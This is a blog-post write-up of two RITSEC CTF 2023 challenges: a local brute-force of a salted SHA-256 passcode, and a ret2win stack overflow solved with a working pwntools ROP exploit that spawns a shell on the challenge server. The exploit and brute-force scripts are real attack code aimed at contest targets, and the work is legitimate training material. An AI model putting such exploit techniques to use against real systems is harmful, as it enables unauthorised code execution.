---
layout: post
title: "RITSEC CTF 2023 Writeup"
date: 2023-04-03
categories: ctf
excerpt_separator: <!--more-->
---

Finished as 252nd out of 717, with 10 flags and 902 points.<br>
Writeup for RITSEC CTF 2023 challenges:
- [Guess the Password (263 Points, 175 Solves)](#guess-the-password-263-points-175-solves)
- [ret2win (83 Points, 208 Solves)](#ret2win-83-points-208-solves)<!--more-->

<br>

## Guess the Password (263 Points, 175 Solves)

The python source code of the challenge is given, and the passcode verification is as follows:

```python
class Server:
    def chatter(self, connection_info):
        ...
        client_socket.send( "Enter the passcode to access the secret: \n".encode() )
                user_input = client_socket.recv(1024).decode() [:8]

                if len(user_input) == 8 and self.encoder.check_input(user_input):
                    secret = self.encoder.flag_from_pwd(user_input)
                    response = f"RS{ {secret} }\n"

                else:
                    response = "That password isn't right!\n\tHint: The last 8 digits of your phone number\n"

class Encoder():
    key = "657fa7558ae9011e8b9d3f56d5c083273557c3139f27d7b62cac458eb1a1a19d"
    secret = "xxxxCORRUPTED_SECRETxxxx"
    ...
    def hash(self, user_input):
        salt = "RITSEC_Salt"
        return hashlib.sha256(salt.encode() + user_input.encode()).hexdigest()

    def check_input(self, user_input):
        hashed_user_input = self.hash(user_input)
        # print("{0} vs {1}".format(hashed_user_input, self.hashed_key))
        return hashed_user_input == self.hashed_key
```

Using *Hint: The last 8 digits of your phone number*, we can guess that the password is 8 numerical digits. <br>
During the CTF, I just thought 26 ** 8 was too large to brute force (guess) compared to 10 ** 8, and so I went with 8 numerical digits.<br>
I should have read the hint more carefully, but I was lucky.<br>
The method of checking the key is given to us, and the passcode is quite short.<br>
So we can brute force the passcode locally, and get the flag.<br>
Copy the `check_input` and `hash` functions and write a short script.

```python
import hashlib, json
from tqdm import tqdm

key = "657fa7558ae9011e8b9d3f56d5c083273557c3139f27d7b62cac458eb1a1a19d"

def hash(user_input):
    salt = "RITSEC_Salt"
    return hashlib.sha256(salt.encode() + user_input.encode()).hexdigest()

def check_input(user_input):
    hashed_user_input = hash(user_input)
    #print("{0} vs {1}".format(hashed_user_input, key))
    return hashed_user_input == key

for i in tqdm(range(0, 100000000)):
    if check_input(str(i).rjust(8)):
        print("Found")
        print(i)
        break
```

Submit this passcode and the flag is printed out.

```
Enter the passcode to access the secret:
54744973
RS{'PyCr@ckd'}
```

Flag: `RS{'PyCr@ckd'}`

<br>
<br>
<br>

## ret2win (83 Points, 208 Solves)



Checksec output
```
Partial RELRO    No canary found    NX disabled    No PIE ...
```

Decompiled with IDA

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  puts("Are you expert at exploit development, join the world leading cybersecurity company, Republic of Potatoes(ROP)");
  puts("[*] This is a simple pwn challenge...get to the secret function!!");
  user_input("[*] This is a simple pwn challenge...get to the secret function!!", argv);
  return 0;
}
```

The challenge is to get to the secret function.<br>
Looking around in IDA, we find the secret function.

```c
int __fastcall supersecrettoplevelfunction(int a1, int a2)
{
  puts("[*]  if you figure out my address, you are hired.");
  if ( a1 == -889275714 && a2 == -1059145026 )
    return system("/bin/sh");
  else
    return puts("[!!] You are good but not good enough for my company");
}
```

The only way to get to this secret function seems to be by overwriting the return address, as hinted by the name of the challenge.<br>
Sure enough, `user_input` uses `gets` which is vulnerable to buffer overflow.

```c
int user_input()
{
  char v1[32]; // [rsp+0h] [rbp-20h] BYREF

  gets(v1);
  return printf("[*] Good start %s, now do some damage :) \n", v1);
}
```

We use gdb to find the address of the secret function, and the offset from the buffer to the return address.<br>
But just returning to the secret function is not enough, we have to set its arguments `a1(rdi) == -889275714 && a2(rsi) == -1059145026`.<br>
We could have checked the disassembly in gdb to get the two's complement hexadecimal format of these two values,<br>
but during the CTF I wrote a script to find them.

```python
def twos_complement_64(n):
    binary = bin(n)[2:].rjust(64, "0")
    ones_complement = "".join(['0' if c == '1' else '1' for c in binary])
    twos_complement = bin(int(ones_complement, 2) + 1)[2:]
    hexadecimal = [hex(int(twos_complement[i : i + 4], 2))[2:] for i in range(0, len(twos_complement), 4)]

    print("Binary:".ljust(20), binary)
    print("One's Complement:".ljust(20), ones_complement)
    print("Two's Complement:".ljust(20), twos_complement)
    print("Hexadecimal".ljust(20), "".join(hexadecimal))

twos_complement_64(889275714)
twos_complement_64(1059145026)
```
```
$> python script.py
Binary:              0000000000000000000000000000000000110101000000010100010101000010
One's Complement:    1111111111111111111111111111111111001010111111101011101010111101
Two's Complement:    1111111111111111111111111111111111001010111111101011101010111110
Hexadecimal          ffffffffcafebabe
Binary:              0000000000000000000000000000000000111111001000010100010101000010
One's Complement:    1111111111111111111111111111111111000000110111101011101010111101
Two's Complement:    1111111111111111111111111111111111000000110111101011101010111110
Hexadecimal          ffffffffc0debabe
```

Now that we have the values, we use Return Oriented Programming to set the arguments, and return to the secret function.<br>
I used [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) to find the gadgets.
Final Script

```python
from pwn import *

# p = process("./ret2win")
p = remote("ret2win.challenges.ctf.ritsec", port)

pop_rdi = 0x4012b3
pop_rsi_r15 = 0x4012b1
secret = 0x401196
arg1 = 0xffffffffcafebabe # -889275714
arg2 = 0xffffffffc0debabe # -1059145026

payload = b"A" * 0x20 + b"B" * 0x08
payload += p64(pop_rdi)
payload += p64(arg1)
payload += p64(pop_rsi_r15)
payload += p64(arg2)
payload += p64(0)
payload += p64(secret)

p.send(payload)
p.interactive()
```

Flag: `RS{WHAT'S_A__CTF_WITH0UT_RET2WIN}`
